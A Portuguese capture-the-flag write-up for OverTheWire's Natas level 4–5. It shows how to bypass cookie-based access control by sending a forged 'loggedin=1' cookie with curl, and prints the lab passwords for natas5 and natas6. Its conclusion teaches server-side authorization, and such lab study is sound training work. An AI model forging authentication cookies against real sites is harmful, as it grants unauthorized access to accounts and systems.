# 🕵️ Natas - Nível 04–05 (🇧🇷 Português)  
*Data:* 24/05/2025  
*Dificuldade:* Fácil  
*Categoria:* Web

---

## 🎯 OBJETIVO

Acessar `http://natas5.natas.labs.overthewire.org` e obter a senha para avançar ao nível 6.

---

## 🔎 ANÁLISE

- Após fazer login com as credenciais corretas, o site exibe a seguinte mensagem:
  > **Acesso não permitido. Você não está logado.**
- O código-fonte da página não traz nenhuma informação útil, então decidimos inspecionar a requisição HTTP através do DevTools do navegador.
- Na seção de **Cookies**, uma flag nos chama atenção: `loggedin=0`. Isso indica que a sessão **não está autenticada**.
- E se alterarmos esse valor?

---

## 🧱 ETAPAS

1. Notamos que o cookie `loggedin` está definido como `0`, indicando que não estamos logados.
2. Decidimos alterar manualmente esse valor para `1`.
3. No terminal, montamos uma requisição com o cabeçalho `Cookie` modificado:
```
curl http://natas5.natas.labs.overthewire.org/ \  
-u natas5:0n35PkggAPm2zbEpOU802c0x0Msn1ToK \  
-H "Cookie: _ga=GA1.1.325147876.1747444879; _ga_RD0K2239G0=GS2.1.s1748038204\$o13\$g1\$t1748038952\$j0\$l0\$h0;
loggedin=1"  
```
4. Ao executar, recebemos a seguinte resposta: `Access granted. The password for natas6 is 0RoJwHdSKWFTYR5WuiAewauSuNaBXned`

---

## 🔑 SENHA ENCONTRADA

```
0RoJwHdSKWFTYR5WuiAewauSuNaBXned
```

---

## ✅ CONCLUSÃO

Este nível demonstra como o controle de acesso baseado em cookies pode ser facilmente burlado ao manipular flags do lado do cliente.
Decisões de segurança nunca devem depender de valores que o usuário pode modificar, como cookies, sem uma validação adequada no servidor.

---

## 🧪 COMANDOS UTILIZADOS


`curl:` Ferramenta de linha de comando para enviar requisições HTTP.  
`-u:` Define o usuário e senha no formato usuario:senha.  
`-H:` Permite adicionar um cabeçalho manual — neste caso, um Cookie alterado.  

---

## 🧠 OBSERVAÇÕES

Usar cookies como loggedin=1 para controlar acesso é extremamente inseguro. Qualquer atacante pode modificar esse valor com ferramentas básicas como curl, DevTools do navegador ou Burp Suite.
Em aplicações reais, o controle de autenticação e autorização deve ser feito no lado do servidor, com tokens assinados ou sessões que não possam ser forjadas pelo cliente.

---


<p align="center">
  <a href="../Natas03-04/Readme-BR.md">⬅️ Level 02–03</a> • 
  <a href="../Natas05-06/Readme-BR.md">Level 04–05 ➡️</a>
</p>
